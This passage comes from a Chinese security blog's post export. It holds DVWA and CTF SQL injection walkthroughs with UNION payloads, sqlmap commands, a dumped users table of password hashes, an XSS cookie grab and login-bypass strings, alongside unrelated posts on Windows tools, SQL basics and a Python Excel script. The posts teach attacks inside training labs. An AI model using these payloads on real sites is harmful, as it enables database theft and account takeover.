'&lt;pre&gt;' . mysqli_error($GLOBALS["___mysqli_ston"]) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = "SELECT COUNT(*) FROM users;";$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS["___mysqli_ston"]);?&gt; 分析使用了mysqli_real_escape_string函数对特殊字符进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 利用1id=1&apos; 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;\&apos;&apos; at line 1 改一改，还是报错 1id=1&apos; or &apos;1&apos;=&apos;1 -- 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;\&apos; or \&apos;1\&apos;=\&apos;1 --&apos; at line 1 1id=1 or 1 = 1 查询成功，说明存在数字型注入。 （由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。） 猜表名：11 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 得到表名：guestbook,users 猜列名：考虑到单引号被转义，可以利用16进制进行绕过，抓包更改参数id为 11 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 # 得到列： 1id,name,password,email,birthday,user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,pid 猜用户数据抓包修改参数id为 11 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 得到用户数据：admin 5f4dcc3b5aa765d61d8327deb882cf99 High等级123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125;?&gt; 可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 漏洞利用虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。 11 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # Impossible等级123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。 SQLmap在XSS的reflected输入1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 拿到cookie，要自己手打，复制PDF的有问题 1security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6 然后跑sqlmap12sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; 1234567891011121314151617181920212223sqlmap identified the following injection point(s) with a total of 211 HTTP(s) requests:---Parameter: id (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT) Payload: id=1&apos; OR NOT 9083=9083#&amp;Submit=Submit Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=1&apos; AND (SELECT 3545 FROM(SELECT COUNT(*),CONCAT(0x716a716a71,(SELECT (ELT(3545=3545,1))),0x716b707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- XEQK&amp;Submit=Submit Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1&apos; AND SLEEP(5)-- tAHb&amp;Submit=Submit Type: UNION query Title: MySQL UNION query (NULL) - 2 columns Payload: id=1&apos; UNION ALL SELECT NULL,CONCAT(0x716a716a71,0x4f467165756c664d454e536f626c4a5452466d7048626c717976795a454b7a565578707376506767,0x716b707071)#&amp;Submit=Submit---[20:28:38] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: Apache 2.4.9, PHP 5.5.12back-end DBMS: MySQL &gt;= 5.0 爆数据库1python .\sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; --current-db --tables 没想到它顺便连表也爆了 123456Database: dvwa[2 tables]+------------------------------------------------------+| guestbook || users |+------------------------------------------------------+ 爆列名12python .\sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; -T users --columns 123456789101112131415Database: dvwaTable: users[8 columns]+--------------+-------------+| Column | Type |+--------------+-------------+| user | varchar(15) || avatar | varchar(70) || failed_login | int(3) || first_name | varchar(15) || last_login | timestamp || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+--------------+-------------+ 爆用户名12python .\sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; -T users --dump 123456789101112Database: dvwaTable: users[5 entries]+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| user_id | avatar | user | password | last_name | first_name | last_login | failed_login |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| 1 | http://localhost/dvwa/hackable/users/admin.jpg | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | 2018-04-25 21:55:38 | 0 || 2 | http://localhost/dvwa/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | 2018-04-25 21:55:38 | 0 || 3 | http://localhost/dvwa/hackable/users/1337.jpg | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | 2018-04-25 21:55:38 | 0 || 4 | http://localhost/dvwa/hackable/users/pablo.jpg | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | 2018-04-25 21:55:38 | 0 || 5 | http://localhost/dvwa/hackable/users/smithy.jpg | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | 2018-04-25 21:55:38 | 0 |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+ 参考链接：新手指南：DVWA-1.9全级别教程之SQL InjectionDVWA SQL Injection 通关教程MySQL 字符串连接CONCAT()函数浅析MySQL中concat以及group_concat的使用PHP mysql_real_escape_string() 函数]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows好用的小工具]]></title>
    <url>%2F2018%2F04%2F27%2FWindows%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[介绍内容来自微信公众号：少数派 0x00 WGestures除了键盘操作外，鼠标手势也是提高效率的重要手段。借助 WGestures，你可以在任何窗口通过鼠标右键或滚轮等绘制手势来执行各种命令，实现多任务处理、媒体控制、网页导航、命令行操作等功能。你也可以根据需要按应用设置手势或添加黑名单，防止误操作。 WGestures 由国人应元东开发。他的其它一些作品包括模拟机械键盘声音的 Tickeys、轻量级词典 QingDict 和应用切换器增强 CmdTap 等。 0x01 Snipaste作为 Windows 平台上最有特色的截图软件之一，Snipaste 自诞生之日起就受到了众多关注。除了自动检测边界及文本、形状、箭头、涂鸦、高亮、马赛克等强大标注功能外，Snipaste 还能让你将截图或剪贴板内容直接固定在屏幕上，方便随时查看。 Snipaste 由博士研究生 levie 历经三年开发，目前所有功能免费且无广告，同时提供商店版及绿色免安装版，macOS 及 Linux 版也正在路上。 0x02 Wox如果你在寻找一款类似 Alfred 的快捷启动器，Wox 可以说是你的不二之选。它可以调用 Everything 进行快速全局搜索，也可以通过关键词唤起网络搜索引擎。你还可以安装各种插件，实现翻译、天气、命令行等进阶功能。 详细介绍的教程 0x03 Yu Writer一款能找到写作乐趣的 Markdown 文本编辑器 相比 macOS 的百花齐放，在 Windows 上用 Markdown 进行写作一直没有太多选择，直到 Yu Writer 横空出世。你可以利用它自由写作，并在统一的文档库中进行管理，Yu Writer 会自动保存你的写作进度及操作记录，随时回滚至以前版本。写作完成之后，你可以将文章导出为 PDF、Docx、HTML 和微信公众号等多种格式，并选择主题配色。Yu Writer 的界面同样支持更换主题，功能区也可以自由定制。 少数派之前也详细介绍过 Yu Writer，关注少数派（ID：sspaime）在后台回复「Yu Writer 」了解更多。 除了 Yu Writer 外，Windows 平台上还有为知笔记和 Leanote 等支持 Markdown 的国产笔记应用，欢迎大家下载体验。如果你只是需要一款更强大的文本编辑器，可以试试 EverEdit 或 Notepad++（台湾同胞开发）等软件，相信不会让你失望。 0x04 任务栏透明化：TranslucentTB这是一个可以让 Windows 底部的菜单栏变得模糊、完全透明的小插件。 0x05 电子书管理神器：CalibreKindle 用户耳熟能详的电子书管理神器 Calibre，也是一款高质量的开源软件。它可以管理几乎所有的电子书格式，与电子书有关的所有操作都可以在 Calibre 一个软件中完成。图书管理、格式转换、新闻获取、电子书编辑……几乎无所不能。 之前在外观上稍显落后，新版本已经改进很多，我想不到有什么理由拒绝使用它。如果你是电子书爱好者，一定不能错过这款神器。]]></content>
      <categories>
        <category>趣味玩耍</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（3）：MySQL-information_schema介绍]]></title>
    <url>%2F2018%2F04%2F26%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9AMySQL-information-schema%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[一、information_schema是什么information_schema是MySQL自带的一个信息数据库，其保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名，数据库的表，表栏的数据类型与访问权限等。 也就是说当你建立一个新的数据库，或者在已有的数据库中增删改表的话，都会记录在information_schema库中。 它提供了访问数据库元数据的方式。什么是元数据呢。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。 在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。 例如下面就可以把全部数据库select出来 12345678910111213mysql&gt; select schema_name from information_schema.schemata;+--------------------+| schema_name |+--------------------+| information_schema || learning || mysql || performance_schema || sakila || sys || t2 || test |+--------------------+ 把数据库的表select出来 12345678910111213141516mysql&gt; SELECT * FROM `TABLE_CONSTRAINTS`limit 10;+--------------------+-------------------+-----------------+--------------+---------------+-----------------+| CONSTRAINT_CATALOG | CONSTRAINT_SCHEMA | CONSTRAINT_NAME | TABLE_SCHEMA | TABLE_NAME | CONSTRAINT_TYPE |+--------------------+-------------------+-----------------+--------------+---------------+-----------------+| def | auroralab | PRIMARY | auroralab | user | PRIMARY KEY || def | day06 | PRIMARY | day06 | users | PRIMARY KEY || def | dvwa | PRIMARY | dvwa | guestbook | PRIMARY KEY || def | dvwa | PRIMARY | dvwa | users | PRIMARY KEY || def | mysql | PRIMARY | mysql | columns_priv | PRIMARY KEY || def | mysql | PRIMARY | mysql | db | PRIMARY KEY || def | mysql | PRIMARY | mysql | engine_cost | PRIMARY KEY || def | mysql | PRIMARY | mysql | event | PRIMARY KEY || def | mysql | PRIMARY | mysql | func | PRIMARY KEY || def | mysql | PRIMARY | mysql | gtid_executed | PRIMARY KEY |+--------------------+-------------------+-----------------+--------------+---------------+-----------------+10 rows in set (0.47 sec) 二、information_schema数据库主要表说明SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表。 TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 COLLATIONS表：提供了关于各字符集的对照信息。 COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。 TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。 KEY_COLUMN_USAGE表：描述了具有约束的键列。 ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。 VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。 TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表。 参考链接：mysql information_schema介绍十分钟了结MySQL information_schema]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[滥用 MySQL LOCAL INFILE 读取客户端文件]]></title>
    <url>%2F2018%2F04%2F25%2F%E6%BB%A5%E7%94%A8%20MySQL%20LOCAL%20INFILE%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[LOAD DATA INFILEMySQL 中提供了LOAD DATA INFILE语句来插入数据。 以下实例中将从当前目录中读取文件 dump.txt ，将该文件中的数据插入到当前数据库的 mytbl 表中。 1mysql&gt; LOAD DATA LOCAL INFILE &apos;dump.txt&apos; INTO TABLE mytbl; 如果指定LOCAL关键词，则表明从客户主机上按路径读取文件。如果没有指定，则文件在服务器上按路径读取文件。 你能明确地在LOAD DATA语句中指出列值的分隔符和行尾标记，但是默认标记是定位符和换行符。 两个命令的 FIELDS 和 LINES 子句的语法是一样的。两个子句都是可选的，但是如果两个同时被指定，FIELDS 子句必须出现在 LINES 子句之前。 如果用户指定一个 FIELDS 子句，它的子句 （TERMINATED BY、[OPTIONALLY] ENCLOSED BY 和 ESCAPED BY) 也是可选的，不过，用户必须至少指定它们中的一个。 123mysql&gt; LOAD DATA LOCAL INFILE &apos;dump.txt&apos; INTO TABLE mytbl -&gt; FIELDS TERMINATED BY &apos;:&apos; -&gt; LINES TERMINATED BY &apos;\r\n&apos;; LOAD DATA 默认情况下是按照数据文件中列的顺序插入数据的，如果数据文件中的列与插入表中的列不一致，则需要指定列的顺序。 如，在数据文件中的列顺序是 a,b,c，但在插入表的列顺序为b,c,a，则数据导入语法如下： 12mysql&gt; LOAD DATA LOCAL INFILE &apos;dump.txt&apos; -&gt; INTO TABLE mytbl (b, c, a); 浅谈MySQL load data local infile细节 – 从源码层面mysql 的load data local infile命令如果在使用过程中出现提示： 1ERROR 1148 (42000): The used command is not allowed with this MySQL version 这种情况一般是由于MySQL限制了客户端导入本地文件的权限， 解决方案： MySQL远程导入数据LOAD DATA LOCAL INFILE …关于命令load data local infile 配置MySQL安全配置正餐一道CTF题目的学习 滥用 MySQL LOCAL INFILE 读取客户端文件: https://w00tsec.blogspot.co.uk/2018/04/abusing-mysql-local-infile-to-read.html]]></content>
      <categories>
        <category>Web安全</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo的Next主题实现二级categories]]></title>
    <url>%2F2018%2F04%2F25%2FHexo%E7%9A%84Next%E4%B8%BB%E9%A2%98%E5%AE%9E%E7%8E%B0%E4%BA%8C%E7%BA%A7categories%2F</url>
    <content type="text"><![CDATA[just like this 123categories: - 一级分类- 二级分类 注意一下-后面还有个空格]]></content>
      <categories>
        <category>GitHub hexo建站</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DDL、DML、DCL的区别和理解]]></title>
    <url>%2F2018%2F04%2F25%2FDDL%E3%80%81DML%E3%80%81DCL%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[DML DML（data manipulation language）数据操纵语言： 数据操作语言，SQL中处理数据等操作统称为数据操纵语言 123456789101112131.SELECT - retrieve data from the a database 查询 2.INSERT - insert data into a table添加 3.UPDATE - updates existing data within a table 更新 4.DELETE - deletes all records from a table, the space for the records remain 删除 5.CALL - call a PL/SQL or Java subprogram 6.EXPLAIN PLAN - explain access path to data 7.LOCK TABLE - control concurrency 锁，用于控制并发 1234SELECT 列名称 FROM 表名称UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)DELETE FROM 表名称 WHERE 列名称 = 值 DDL DDL（data definition language）数据库定义语言： 数据定义语言，用于定义和管理 SQL 数据库中的所有对象的语言 1234567891011121314151.CREATE - to create objects in the database 创建 2.ALTER - alters the structure of the database 修改 3.DROP - delete objects from the database 删除 4.TRUNCATE - remove all records from a table, including all spaces allocated for the records are removed TRUNCATE TABLE [Table Name]。 5.COMMENT - add comments to the data dictionary 注释 6.GRANT - gives user&apos;s access privileges to database 授权 7.REVOKE - withdraw access privileges given with the GRANT command 收回已经授予的权限 12345678910111213CREATE TABLE 表名称(列名称1 数据类型,列名称2 数据类型,列名称3 数据类型,....)ALTER TABLE table_nameALTER COLUMN column_name datatypeDROP TABLE 表名称DROP DATABASE 数据库名称 DCL DCL（Data Control Language）数据库控制语言： 是用来设置或更改数据库用户或角色权限的语句，包括（grant,deny,revoke等）语句。这个比较少用到。 12345671.COMMIT - save work done 提交 2.SAVEPOINT - identify a point in a transaction to which you can later roll back 保存点 3.ROLLBACK - restore database to original since the last COMMIT 回滚 4.SET TRANSACTION - Change transaction options like what rollback segment to use 设置当前事务的特性，它对后面的事务没有影响 ​]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（2）：MySQL长字符截断]]></title>
    <url>%2F2018%2F04%2F24%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9AMySQL%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%2F</url>
    <content type="text"><![CDATA[介绍：转载来自MySQL 字符截断攻击 先创建一张表 12345CREATE table users(id int(11) not NULL primary key auto_increment,username char(8) not NULL,password char(10) not NULL); 正常插入 admin ; admin insert into users(username,password) values(&#39;admin&#39;,&#39;admin&#39;); 超出字符限制插入(用户名长度为8): insert into users(username,password) values(&#39;admin &#39;,&#39;admin&#39;); insert into users(username,password) values(&#39;admin 1&#39;,&#39;admin&#39;); 超过位数的用户名会被截断 ,所以 ,admin 1 与 admin共存于一张表 select username from users where username = &#39;admin&#39;; 发现两个用户都被select出来 如果管理员的登录界面是这样判断的 : $sql = &quot;select count(*) from users where username = &#39;admin&#39; and password=&#39;任意&#39; &quot;; 那我们只需要注册一个账号为admin 1,password = &quot;任意&quot;, 就可以用admin登录 题目：https://ringzer0team.com/challenges/171 随手试了一下二次注入，发现有点不像于是进行长度截断注册 12username=admin 1#password=1 登录 12username=adminpassword=1 ####]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web安全，SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（1）：注释]]></title>
    <url>%2F2018%2F04%2F24%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E6%B3%A8%E9%87%8A%2F</url>
    <content type="text"><![CDATA[各个数据库的注释： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576OracleREM单行注释-- 单行注释/*多行注释*/ MS SQL Server-- 单行注释/*多行注释*/ MySQL#单行注释-- 单行注释（特别注意，-- 后有个空格！！！）/*多行注释*/ 总结：/*多行注释*/ 和-- 单行注释都差不多，MySQL要注意。非标准的#和REM最好还是不要用了为了兼容-- 后面最好都加空格MySQL注释的说明－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－‘--’作为注释起始标记一些其他SQL数据库采用“--”作为注释开始标志。MySQL服务器采用“#”作为注释起始字符。对于MySQL服务器，也能使用C风格的注释：/*该处为注释*/。请参见9.5节，“注释语法”。MySQL服务器3.23.3和更高版本支持“--”注释风格，但要求注释后面跟1空格（或控制字符，如新行）。之所以要求使用空格，是为了防止与自动生成SQL查询有关的问题，它采用了类似下面的代码，其中，自动为“!payment!”插入“payment”的值：UPDATE account SET credit=credit-!payment!考虑一下，如果“payment”的值为负数如“-1”时会出现什么情况：UPDATE account SET credit=credit--1在SQL中“credit--1”是合法的表达式，但是，如果“--1”被解释为注释开始，部分表达式将被舍弃。其结果是，表达式的意义与预期的意义完全不同。UPDATE account SET credit=credit该语句不会对值作任何更改！这表明，允许注释以“--”开始会产生严重后果。采用MySQL服务器3.23.3和更高版本中的这类注释方法，“credit--1”实际上很安全。另一个安全特性是，mysql命令行客户端将删除所有以“--”开头的行。仅当使用高于3.23.3的MySQL时，下述信息才有意义：如果有1个文本文件形式的SQL程序，该文件包含“--”注释，应按下述方式使用replace实用工具，将其转换为使用“#”字符的注释：shell&gt; replace &quot; --&quot; &quot; #&quot; &lt; text-file-with-funny-comments.sql \ | mysql db_name而不是通常的：shell&gt; mysql db_name &lt; text-file-with-funny-comments.sql你也可以编辑注释文件，将“--”注释更改为“#”注释：shell&gt; replace &quot; --&quot; &quot; #&quot; -- text-file-with-funny-comments.sql使用下述命令将其改回去：shell&gt; replace &quot; #&quot; &quot; --&quot; -- text-file-with-funny-comments.sql 题目：Most basic SQLi pattern.(point 1)12username: admin&apos;#password: 1 签到题，注释后面的password语句 解释： 如果后台的数据库语句是这样子的 1select * from user where username = '$username' and password = '$password' 输入之后，后面的password就被注释掉了，如果有admin的用户，就可以登录成功 1select * from user where username = 'admin'# and password = '1' ACL rulezzz the world.(point 2)随手测试 1username=admin&apos; 得到 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos;&apos; at line 4 随手闭合一下 1username=admin&apos; or 1# ###]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>转载,SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python合并Excel表格]]></title>
    <url>%2F2018%2F04%2F23%2FPython%E5%90%88%E5%B9%B6Excel%E8%A1%A8%E6%A0%BC%2F</url>
    <content type="text"><![CDATA[前言：因为有个同学问我有没有快速合并二十多个表格的方法，我说用Python，，， 然后，就有了下面的代码 #### 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/22 0:40# @Author : Lhaihai# @File : CombinedForm.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : 合并文件夹的二十多个Excel"""import openpyxlimport openpyxl.cellfrom openpyxl.utils import get_column_letterimport osdef main(file_dir): for root, dirs, files in os.walk(file_dir): if(root != file_dir): continue print(root) #当前目录路径 print(dirs) #当前路径下所有子目录 print(files) #当前路径下所有非目录子文件 path = "xxxxxxxxxxx" wbmain = openpyxl.load_workbook(path + '数据导入模板.xlsx') sheetmain1 = wbmain['1.学生本人基本信息'] sheetmain2 = wbmain['2.学生家庭成员基本信息'] try: sheetmain3 = wbmain['3.学生本人干部任职信息'] except: print('Worksheet 3.学生本人干部任职信息 does not exist.') try: sheetmain4 = wbmain['4.论文'] # print(sheetmain4) except: print('Worksheet 4.论文 does not exist.') sheetmain5 = wbmain['5.评优'] try: sheetmain6 = wbmain['6.实习数据'] # print(sheetmain6) except: print('Worksheet 6.实习数据 does not exist.') sheetmain7 = wbmain['7.学生活动'] indexrow = [2,2,2,2,2,2,2] for file in files: if(file == '数据导入模板.xlsx'): continue print(path+file) wb = openpyxl.load_workbook(path+file) sheet1 = wb['1.学生本人基本信息'] print(sheet1.max_row) for i in range(2,int(sheet1.max_row)+1): if(not sheet1['A'+str(i)].value): continue for j in range(1,20): letter = get_column_letter(j) sheetmain1[letter+str(indexrow[0])] = sheet1[letter+str(i)].value print(sheetmain1[letter+str(indexrow[0])].value) indexrow[0]+=1 # sheet2 = wb['2.学生家庭成员基本信息'] # for i in range(2,int(sheet2.max_row)+1): # for j in range(1,14): # letter = get_column_letter(j) # sheetmain2[letter+str(indexrow[1])] = sheet2[letter+str(i)].value # print(sheetmain2[letter+str(indexrow[1])].value) # indexrow[1]+=1 try: sheet3 = wb['3.学生本人干部任职信息'] for i in range(2, int(sheet3.max_row) + 1): if (not sheet3['A' + str(i)].value): continue for j in range(1, 10): letter = get_column_letter(j) sheetmain3[letter + str(indexrow[2])] = sheet3[letter + str(i)].value print(sheetmain3[letter + str(indexrow[2])].value) indexrow[2] += 1 except: print(file+'Worksheet 3.学生本人干部任职信息 does not exist') try: sheet4 = wb['4.论文'] for i in range(2, int(sheet4.max_row) + 1): if (not sheet4['A' + str(i)].value): continue for j in range(1, 8): letter = get_column_letter(j) sheetmain4[letter + str(indexrow[3])] = sheet4[letter + str(i)].value print(sheetmain4[letter + str(indexrow[3])].value) indexrow[3] += 1 except: print('Worksheet 4.论文 does not exist.') try: sheet5 = wb['5.评优'] for i in range(2, int(sheet5.max_row) + 1): if (not sheet5['A' + str(i)].value): continue for j in range(1, 8): letter = get_column_letter(j) sheetmain5[letter + str(indexrow[4])] = sheet5[letter + str(i)].value print(sheetmain5[letter + str(indexrow[4])].value) indexrow[4] += 1 except: print(file+'Worksheet 5.评优 does not exist.') try: sheet6 = wb['6.实习数据'] for i in range(2, int(sheet6.max_row) + 1): if (not sheet6['A' + str(i)].value): continue for j in range(1, 9): letter = get_column_letter(j) sheetmain6[letter + str(indexrow[5])] = sheet6[letter + str(i)].value print(sheetmain6[letter + str(indexrow[5])].value) indexrow[5] += 1 except: print('Worksheet 6.实习数据 does not exist.') sheet7 = wb['7.学生活动'] for i in range(2, int(sheet7.max_row) + 1): if (not sheet7['A' + str(i)].value): continue for j in range(1, 9): letter = get_column_letter(j) sheetmain7[letter + str(indexrow[6])] = sheet7[letter + str(i)].value print(sheetmain7[letter + str(indexrow[6])].value) indexrow[6]+=1 wbmain.save(path+'example2.xlsx')if __name__ == '__main__': path= r'xxxxxx' main(path)]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Postman使用]]></title>
